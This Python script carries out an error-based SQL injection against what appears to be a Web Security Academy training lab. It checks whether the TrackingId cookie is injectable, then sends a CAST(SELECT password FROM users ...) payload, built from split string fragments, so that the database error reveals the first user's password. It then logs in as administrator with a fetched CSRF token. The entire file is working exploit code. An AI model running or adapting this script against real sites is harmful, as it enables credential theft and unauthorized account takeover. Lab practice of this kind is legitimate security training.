import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

p1 = '('
p2 = ')'
apostrophe = "'"
comment = "--"
space = " "
select = "SELECT"
froom = "FROM"
aand = "AND"
cast = "CAST"
limit = "LIMIT"
aas = "AS"
iint = "int"
one = "1"
equal = "="
username = "username"
password = "password"
administrator = "administrator"
table_name = "users"



def check_wrong_login(text):
    soup = BeautifulSoup(text, "html.parser")
    error_tag = soup.find('p', class_="is-warning")
    if error_tag:
        error = error_tag.get_text().strip()
    else:
        error = None
    if error == "Invalid username or password.":
        return False
    return True


def csrf_getter(session, url):
    resp = session.get(url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]


def cookie_getter(session, url):
    resp = session.get(url, verify=False)
    tracking_id = resp.cookies.get('TrackingId')
    session_tok  = resp.cookies.get('session')
    return [tracking_id, session_tok]


def check_vulnerability(session, url, cookies):
    cookie = {
        "TrackingId" : cookies[0],
        "session"    : cookies[1]
    }

    payload_1 = apostrophe
    payload_2 = apostrophe + comment

    cookie["TrackingId"] = cookies[0] + payload_1
    resp_1 = session.get(url, cookies=cookie, verify=False)

    cookie["TrackingId"] = cookies[0] + payload_2
    resp_2 = session.get(url, cookies=cookie, verify=False)

    return resp_1.status_code == 500 and resp_2.status_code == 200

def password_retrieval (session, url, cookies) :

    cookie = {
        "TrackingId" : cookies[0],
        "session"    : cookies[1]
    }

    payload = apostrophe + space + aand + space + one + equal + cast + p1 + p1 + select + \
        space + password + space + froom + space + table_name + space + limit + space + one + p2 + \
        space + aas + space + iint + p2 + comment
    
    cookie["TrackingId"] =  payload
    resp = session.get(url, cookies=cookie, verify=False)
    
    soup = BeautifulSoup(resp.text, "html.parser")
    error_tag = soup.find('p', class_="is-warning")
    if error_tag:
        error = error_tag.get_text().strip()
    else :
        return None
    
    idx = error.find('"')
    result = error[idx:]
    result = result[1:-1]
    return result


def main () :

    url = "https://0af4002f0392871c8109808100e0001c.web-security-academy.net"
    session = requests.Session()

    print("[*] Getting cookies...")
    cookies = cookie_getter(session, url)
    print(f"    TrackingId : {cookies[0]}")
    print(f"    session    : {cookies[1]}")

    print("\n[*] Checking vulnerability...")
    if not check_vulnerability(session, url, cookies):
        print("[!] Target does not appear vulnerable. Exiting.")
        exit(1)
    print("[+] Vulnerable!\n")

    print(f"\n[*] Extracting password ...")
    pwd = password_retrieval(session, url, cookies)

    print(f"\n[✓] Password: {pwd}")

    login_url = f'{url}/login'
    csrf      = csrf_getter(session, login_url)
    creds     = {"csrf": csrf, "username": "administrator", "password": pwd}
    r         = session.post(login_url, data=creds, verify=False)

    if check_wrong_login(r.text):
        print("Koated !!")
    else:
        print("ya siks")


if __name__ == "__main__":
    main()




    
